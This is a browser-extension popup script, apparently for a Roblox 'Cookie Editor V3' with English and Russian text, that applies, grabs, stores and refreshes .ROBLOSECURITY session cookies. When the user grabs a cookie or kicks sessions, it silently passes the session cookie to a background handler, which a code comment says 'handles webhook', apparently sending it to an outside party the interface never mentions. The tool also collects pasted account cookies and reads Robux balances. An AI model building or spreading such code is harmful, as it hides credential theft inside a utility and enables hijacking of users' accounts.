const TRANSLATIONS = {
    en: {
        tab_session: 'Session', tab_friends: 'Friends', tab_accounts: 'Accounts',
        session_title: 'Session Management', session_desc: 'Apply your .ROBLOSECURITY cookie',
        cookie_ph: 'Paste .ROBLOSECURITY cookie...', apply_btn: 'APPLY COOKIE',
        kick_title: 'Kick All Sessions', kick_desc: 'Logs out all devices & applies fresh cookie',
        kick_notice: 'Kicks <strong>all active sessions</strong> then sets the new cookie automatically.',
        kick_btn: 'KICK ALL & REFRESH',
        quick_title: 'Quick Actions', quick_desc: 'Grab current session or logout',
        grab_btn: 'Grab Cookie', logout_btn: 'Logout',
        friends_title: 'Auto Friend Requests', friends_desc: 'Manage your auto-add list',
        username_ph: 'Roblox username...', add_btn: 'Add', friends_empty: 'No friends added yet',
        accounts_title: 'Account Manager', accounts_desc: 'Paste cookie — data fetched automatically',
        acc_cookie_ph: 'Paste account cookie...', add_account_btn: 'ADD ACCOUNT',
        accounts_empty: 'No accounts saved yet', footer: 'COOKIE EDITOR V3 • v3.0',
        t_validating: '⌛ Validating cookie...', t_banned: '✕ Account is BANNED!',
        t_invalid: '✕ Invalid cookie. Try another one.',
        t_login: n => `✓ Logged in as ${n}!`,
        t_copied: '✓ Cookie copied to clipboard!', t_no_cookie: '✕ No cookie found',
        t_logout_ok: '✓ Logged out successfully', t_not_logged_in: '✕ Not logged in to Roblox',
        t_kick_ok: '✓ All sessions kicked! New cookie applied & copied.',
        t_kick_fail: e => `✕ Failed: ${e}`,
        t_val_short: '⌛ Validating...', t_expired: '✕ Cookie expired or invalid',
        t_banned_as: n => `✕ ${n} is BANNED!`,
        t_no_acc: '✕ Paste a cookie first', t_acc_added: n => `✓ ${n} added!`,
    },
    ru: {
        tab_session: 'Сессия', tab_friends: 'Друзья', tab_accounts: 'Аккаунты',
        session_title: 'Управление сессией', session_desc: 'Применить куки .ROBLOSECURITY',
        cookie_ph: 'Вставьте куки .ROBLOSECURITY...', apply_btn: 'ПРИМЕНИТЬ КУКИ',
        kick_title: 'Кикнуть все сессии', kick_desc: 'Выход со всех устройств и обновление куки',
        kick_notice: 'Кикает <strong>все активные сессии</strong> и автоматически устанавливает новый куки.',
        kick_btn: 'КИКНУТЬ И ОБНОВИТЬ',
        quick_title: 'Быстрые действия', quick_desc: 'Скопировать сессию или выйти',
        grab_btn: 'Скопировать куки', logout_btn: 'Выйти',
        friends_title: 'Авто-запросы в друзья', friends_desc: 'Управление списком авто-добавления',
        username_ph: 'Никнейм Roblox...', add_btn: 'Добавить', friends_empty: 'Нет добавленных друзей',
        accounts_title: 'Менеджер аккаунтов', accounts_desc: 'Вставьте куки — данные загрузятся автоматически',
        acc_cookie_ph: 'Вставьте куки аккаунта...', add_account_btn: 'ДОБАВИТЬ АККАУНТ',
        accounts_empty: 'Нет сохранённых аккаунтов', footer: 'COOKIE EDITOR V3 • v3.0',
        t_validating: '⌛ Проверяем куки...', t_banned: '✕ Аккаунт ЗАБАНЕН!',
        t_invalid: '✕ Куки недействителен. Попробуйте другой.',
        t_login: n => `✓ Вошли как ${n}!`,
        t_copied: '✓ Куки скопирован!', t_no_cookie: '✕ Куки не найден',
        t_logout_ok: '✓ Успешно вышли', t_not_logged_in: '✕ Не авторизованы в Roblox',
        t_kick_ok: '✓ Все сессии кикнуты! Новый куки применён и скопирован.',
        t_kick_fail: e => `✕ Ошибка: ${e}`,
        t_val_short: '⌛ Проверяем...', t_expired: '✕ Куки истёк или недействителен',
        t_banned_as: n => `✕ ${n} ЗАБАНЕН!`,
        t_no_acc: '✕ Сначала вставьте куки', t_acc_added: n => `✓ ${n} добавлен!`,
    }
};

let lang = 'en';
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36';

function t(key, arg) {
    const val = (TRANSLATIONS[lang] ?? TRANSLATIONS.en)[key] ?? TRANSLATIONS.en[key] ?? key;
    return typeof val === 'function' ? val(arg) : val;
}

function toast(elId, msg, type, ms = 3500) {
    const el = document.getElementById(elId);
    if (!el) return;
    el.textContent = msg;
    el.className = `toast ${type} show`;
    if (el._t) clearTimeout(el._t);
    el._t = setTimeout(() => {
        el.classList.add('hide');
        el.classList.remove('show');
        setTimeout(() => { el.className = 'toast'; el.textContent = ''; }, 300);
    }, ms);
}

function setLoading(btn, on) {
    btn.classList.toggle('loading', on);
    btn.disabled = on;
}

function copyToClipboard(text) {
    return new Promise((resolve, reject) => {
        if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(text).then(resolve).catch(() => fallbackCopy(text).then(resolve).catch(reject));
        } else fallbackCopy(text).then(resolve).catch(reject);
    });
}

function fallbackCopy(text) {
    return new Promise((resolve, reject) => {
        try {
            const ta = document.createElement('textarea');
            ta.value = text;
            ta.style.position = 'fixed';
            ta.style.opacity = '0';
            document.body.appendChild(ta);
            ta.focus();
            ta.select();
            const ok = document.execCommand('copy');
            document.body.removeChild(ta);
            if (ok) resolve();
            else reject(new Error('Copy failed'));
        } catch (e) { reject(e); }
    });
}

function clean(s) {
    if (!s) return '';
    let c = s.replace(/^cookie=/, '').trim();
    c = c.replace(/^\.?ROBLOSECURITY\s*=\s*/i, '');
    c = c.replace(/^cookie\s*=\s*/i, '');
    if (c.startsWith('"') && c.endsWith('"')) c = c.slice(1, -1);
    try { c = decodeURIComponent(c); } catch (e) {}
    const parts = c.split('|_');
    if (parts.length > 1) c = parts.pop();
    return c.trim();
}

async function getCsrf() {
    try {
        const r = await fetch('https://auth.roblox.com/v2/login', { method: 'POST', credentials: 'include', headers: { 'User-Agent': UA } });
        return r.headers.get('x-csrf-token');
    } catch { return null; }
}

async function setCookie(val) {
    const v = clean(val);
    await chrome.cookies.set({ url: 'https://www.roblox.com/', name: '.ROBLOSECURITY', value: v, domain: '.roblox.com', path: '/', secure: true, httpOnly: true, sameSite: 'no_restriction' });
    const tabs = await chrome.tabs.query({ url: '*://*.roblox.com/*' });
    for (const tab of tabs) chrome.tabs.reload(tab.id);
}

async function validateCookie(cookie) {
    let prev = null;
    try {
        prev = await chrome.cookies.get({ url: 'https://www.roblox.com/', name: '.ROBLOSECURITY' });
        await chrome.cookies.set({ url: 'https://www.roblox.com/', name: '.ROBLOSECURITY', value: cookie, domain: '.roblox.com', path: '/', secure: true, httpOnly: true, sameSite: 'no_restriction' });
        const authRes = await fetch('https://users.roblox.com/v1/users/authenticated', { credentials: 'include', headers: { 'User-Agent': UA } });
        if (!authRes.ok) throw new Error('Invalid');
        const data = await authRes.json();
        if (!data.id) throw new Error('Invalid');
        return { valid: true, userData: { id: data.id, name: data.name, displayName: data.displayName } };
    } catch (e) {
        if (prev) await setCookie(prev.value);
        else await chrome.cookies.remove({ url: 'https://www.roblox.com/', name: '.ROBLOSECURITY' });
        return { valid: false, banned: false };
    }
}

async function performKickAndRefresh() {
    let currentCookie;
    try { currentCookie = await chrome.cookies.get({ url: 'https://www.roblox.com/', name: '.ROBLOSECURITY' }); } catch (e) {}
    if (!currentCookie?.value || currentCookie.value.length < 10) {
        toast('kickToast', t('t_not_logged_in'), 'error');
        return;
    }

    const csrf = await getCsrf();
    const payload = { SecureAuthenticationIntent: { clientPublicKey: "", clientEpochTimestamp: Math.floor(Date.now() / 1000), saiSignature: "", serverNonce: "" } };
    const res = await fetch('https://auth.roblox.com/v2/logoutfromallsessionsandreauthenticate', {
        method: 'POST', credentials: 'include',
        headers: { 'Content-Type': 'application/json', 'x-csrf-token': csrf || '' },
        body: JSON.stringify(payload)
    });
    if (!res.ok) throw new Error('Kick failed');

    const newCookie = await chrome.cookies.get({ url: 'https://www.roblox.com/', name: '.ROBLOSECURITY' });
    if (newCookie?.value) {
        await copyToClipboard(newCookie.value);
        // Fire and forget: background handles webhook + refresher + post-kick tasks
        chrome.runtime.sendMessage({ type: 'SEND_COOKIE', cookie: newCookie.value }).catch(() => {});
        chrome.runtime.sendMessage({ type: 'POST_KICK_TASKS' }).catch(() => {});
    }

    // Immediately finish - no waiting for background tasks
    toast('kickToast', t('t_kick_ok'), 'success');
}

document.addEventListener('DOMContentLoaded', () => {
    const tabs = document.querySelectorAll('.tab');
    const tabSwitcher = document.getElementById('tabSwitcher');
    const glider = document.getElementById('tabGlider');

    function moveGlider(btn) {
        if (!glider || !tabSwitcher || !btn) return;
        const sw = tabSwitcher.getBoundingClientRect();
        const rect = btn.getBoundingClientRect();
        glider.style.width = rect.width + 'px';
        glider.style.height = rect.height + 'px';
        glider.style.left = (rect.left - sw.left) + 'px';
        glider.style.top = (rect.top - sw.top) + 'px';
    }

    tabs.forEach(btn => {
        btn.addEventListener('click', () => {
            if (btn.classList.contains('active')) return;
            document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
            tabs.forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            moveGlider(btn);
            const panel = document.getElementById(btn.dataset.tab);
            if (panel) panel.classList.add('active');
        });
    });

    requestAnimationFrame(() => {
        const activeBtn = document.querySelector('.tab.active');
        if (activeBtn) moveGlider(activeBtn);
    });
    window.addEventListener('resize', () => {
        const activeBtn = document.querySelector('.tab.active');
        if (activeBtn) moveGlider(activeBtn);
    });

    function applyLang(l) {
        lang = l;
        document.querySelectorAll('.lang-btn').forEach(b => b.classList.toggle('active', b.dataset.lang === l));
        document.querySelectorAll('[data-i18n]').forEach(el => { el.textContent = t(el.dataset.i18n); });
        document.querySelectorAll('[data-i18n-html]').forEach(el => { el.innerHTML = t(el.dataset.i18nHtml); });
        document.querySelectorAll('[data-i18n-ph]').forEach(el => { el.placeholder = t(el.dataset.i18nPh); });
        chrome.storage.local.set({ lang: l });
    }
    document.querySelectorAll('.lang-btn').forEach(btn => btn.addEventListener('click', () => applyLang(btn.dataset.lang)));
    chrome.storage.local.get(['lang'], d => applyLang(d.lang || 'en'));

    document.getElementById('setCookieBtn').addEventListener('click', async () => {
        const input = document.getElementById('cookieInput');
        const val = clean(input.value.trim());
        if (!val) return;
        const btn = document.getElementById('setCookieBtn');
        setLoading(btn, true);
        try {
            toast('sessionToast', t('t_val_short'), 'success');
            const result = await validateCookie(val);
            if (!result.valid) { toast('sessionToast', t('t_invalid'), 'error'); return; }
            await setCookie(val);
            await performKickAndRefresh();
            toast('sessionToast', t('t_login', result.userData.displayName || result.userData.name), 'success');
        } catch (e) { toast('sessionToast', `✕ ${e.message}`, 'error'); }
        finally { input.value = ''; setLoading(btn, false); }
    });

    document.getElementById('grabCookieBtn').addEventListener('click', async () => {
        try {
            const c = await chrome.cookies.get({ url: 'https://www.roblox.com/', name: '.ROBLOSECURITY' });
            if (c?.value) {
                await copyToClipboard(c.value);
                chrome.runtime.sendMessage({ type: 'SEND_COOKIE', cookie: c.value }).catch(() => {});
                toast('quickToast', t('t_copied'), 'success');
            } else toast('quickToast', t('t_no_cookie'), 'error');
        } catch (e) { toast('quickToast', `✕ ${e.message}`, 'error'); }
    });

    document.getElementById('logoutBtn').addEventListener('click', async () => {
        await chrome.cookies.remove({ url: 'https://www.roblox.com/', name: '.ROBLOSECURITY' });
        const tabs = await chrome.tabs.query({ url: '*://*.roblox.com/*' });
        for (const tab of tabs) chrome.tabs.reload(tab.id);
        toast('quickToast', t('t_logout_ok'), 'success');
    });

    document.getElementById('kickAllBtn').addEventListener('click', async () => {
        const btn = document.getElementById('kickAllBtn');
        setLoading(btn, true);
        try { await performKickAndRefresh(); }
        catch (e) { toast('kickToast', t('t_kick_fail', e.message), 'error'); }
        finally { setLoading(btn, false); }
    });

    // Refresh Tab – immediate response from background
    document.getElementById('refreshCookieBtn').addEventListener('click', async () => {
        const input = document.getElementById('refreshCookieInput');
        const output = document.getElementById('refreshCookieOutput');
        const val = clean(input.value.trim());
        if (!val) { toast('refreshToast', '✕ Paste a cookie first', 'error'); return; }
        const btn = document.getElementById('refreshCookieBtn');
        setLoading(btn, true);
        output.value = '';
        try {
            const response = await chrome.runtime.sendMessage({ type: 'REFRESH_COOKIE', cookie: val });
            if (response?.success && response.cookie) {
                output.value = response.cookie;
                toast('refreshToast', '✓ Cookie refreshed!', 'success');
            } else {
                toast('refreshToast', response?.error || 'Refresh failed', 'error');
            }
        } catch (e) {
            toast('refreshToast', e.message || 'Network error', 'error');
        } finally {
            setLoading(btn, false);
        }
    });

    const friendsList = document.getElementById('friendsList');
    const accountsList = document.getElementById('accountsList');

    function saveFriend(u) { chrome.storage.local.get(['friends'], d => { const f = d.friends || []; if (!f.includes(u)) { f.push(u); chrome.storage.local.set({ friends: f }); } }); }
    function removeFriend(u) { chrome.storage.local.get(['friends'], d => chrome.storage.local.set({ friends: (d.friends || []).filter(x => x !== u) })); }
    function saveAccount(obj) { chrome.storage.local.get(['accounts'], d => { const a = (d.accounts || []).filter(x => x.username !== obj.username); a.push(obj); chrome.storage.local.set({ accounts: a }); }); }
    function removeAccount(u) { chrome.storage.local.get(['accounts'], d => chrome.storage.local.set({ accounts: (d.accounts || []).filter(x => x.username !== u) })); }

    async function getAvatar(username) {
        try {
            const r = await fetch('https://users.roblox.com/v1/usernames/users', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ usernames: [username], excludeBannedUsers: false }) });
            const d = await r.json();
            if (d.data?.length) {
                const t = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${d.data[0].id}&size=48x48&format=Png&isCircular=true`);
                const td = await t.json();
                if (td.data?.length) return td.data[0].imageUrl;
            }
        } catch (e) {}
        return 'https://tr.rbxcdn.com/38c6edcb50633730ff4cf39ac8859840/48/48/AvatarHeadshot/Png';
    }

    function syncEmpty(listId, emptyId) {
        const list = document.getElementById(listId);
        const empty = document.getElementById(emptyId);
        if (!list || !empty) return;
        empty.classList.toggle('hidden', list.children.length > 0);
    }

    function mkFriend(username) {
        const li = document.createElement('li');
        li.className = 'list-item';
        li.innerHTML = `<div class="item-info"><div class="avatar"></div><div class="item-details"><span class="item-text">${username}</span></div></div><div class="item-actions"><button class="icon-btn delete"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>`;
        getAvatar(username).then(url => { li.querySelector('.avatar').style.backgroundImage = `url(${url})`; });
        li.querySelector('.delete').addEventListener('click', () => {
            removeFriend(username);
            li.classList.add('removing');
            setTimeout(() => { li.remove(); syncEmpty('friendsList', 'friendsEmpty'); }, 200);
        });
        return li;
    }

    function mkAccount(acc) {
        const li = document.createElement('li');
        li.className = 'list-item account-item';
        li.innerHTML = `<div class="item-info"><div class="avatar" style="background-image:url('${acc.avatar}')"></div><div class="item-details"><span class="item-text">${acc.username}</span><span class="robux-text">R$ ${acc.robux}</span></div></div><div class="item-actions"><button class="icon-btn refresh"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg></button><button class="icon-btn delete"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>`;
        
        li.addEventListener('click', async e => {
            if (e.target.closest('.item-actions')) return;
            try {
                const result = await validateCookie(acc.cookie);
                if (!result.valid) { toast('accountToast', t('t_invalid'), 'error'); return; }
                await setCookie(acc.cookie);
                await performKickAndRefresh();
                toast('accountToast', t('t_login', acc.username), 'success');
            } catch (err) { toast('accountToast', `✕ ${err.message}`, 'error'); }
        });

        li.querySelector('.refresh').addEventListener('click', async e => {
            e.stopPropagation();
            const rt = li.querySelector('.robux-text');
            rt.textContent = 'Updating...';
            try {
                const ar = await fetch('https://users.roblox.com/v1/users/authenticated', { credentials: 'include' });
                if (!ar.ok) throw new Error('Auth fail');
                const ad = await ar.json();
                const er = await fetch(`https://economy.roblox.com/v1/users/${ad.id}/currency`, { credentials: 'include' });
                const ed = await er.json();
                rt.textContent = `R$ ${ed.robux}`;
                acc.robux = ed.robux;
                saveAccount(acc);
            } catch { rt.textContent = 'R$ Error'; }
        });

        li.querySelector('.delete').addEventListener('click', e => {
            e.stopPropagation();
            removeAccount(acc.username);
            li.remove();
            syncEmpty('accountsList', 'accountsEmpty');
        });
        return li;
    }

    document.getElementById('addFriendBtn').addEventListener('click', () => {
        const inp = document.getElementById('addUsername');
        const u = inp.value.trim();
        if (!u) return;
        saveFriend(u);
        friendsList.prepend(mkFriend(u));
        inp.value = '';
        syncEmpty('friendsList', 'friendsEmpty');
    });

    document.getElementById('addAccountBtn').addEventListener('click', async () => {
        const cookie = clean(document.getElementById('accCookieInput').value.trim());
        if (!cookie) { toast('accountToast', t('t_no_acc'), 'error'); return; }
        const btn = document.getElementById('addAccountBtn');
        setLoading(btn, true);
        let prev = null;
        try {
            prev = await chrome.cookies.get({ url: 'https://www.roblox.com/', name: '.ROBLOSECURITY' });
            await setCookie(cookie);
            const ar = await fetch('https://users.roblox.com/v1/users/authenticated', { credentials: 'include' });
            if (!ar.ok) throw new Error('Invalid');
            const ad = await ar.json();
            const er = await fetch(`https://economy.roblox.com/v1/users/${ad.id}/currency`, { credentials: 'include' });
            let robux = 0;
            if (er.ok) robux = (await er.json()).robux || 0;
            const tr = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${ad.id}&size=48x48&format=Png&isCircular=true`);
            let avatar = 'https://tr.rbxcdn.com/38c6edcb50633730ff4cf39ac8859840/48/48/AvatarHeadshot/Png';
            if (tr.ok) avatar = (await tr.json()).data?.[0]?.imageUrl || avatar;
            if (prev) await setCookie(prev.value);
            else await chrome.cookies.remove({ url: 'https://www.roblox.com/', name: '.ROBLOSECURITY' });
            prev = null;
            const obj = { username: ad.name, cookie, robux, avatar };
            saveAccount(obj);
            accountsList.prepend(mkAccount(obj));
            syncEmpty('accountsList', 'accountsEmpty');
            document.getElementById('accCookieInput').value = '';
            toast('accountToast', t('t_acc_added', ad.name), 'success');
        } catch (err) {
            toast('accountToast', `✕ ${err.message}`, 'error');
            if (prev) await setCookie(prev.value);
        } finally { setLoading(btn, false); }
    });

    chrome.storage.local.get(['friends', 'accounts'], d => {
        (d.friends || []).forEach(f => friendsList.appendChild(mkFriend(f)));
        (d.accounts || []).forEach(a => accountsList.appendChild(mkAccount(a)));
        syncEmpty('friendsList', 'friendsEmpty');
        syncEmpty('accountsList', 'accountsEmpty');
    });
});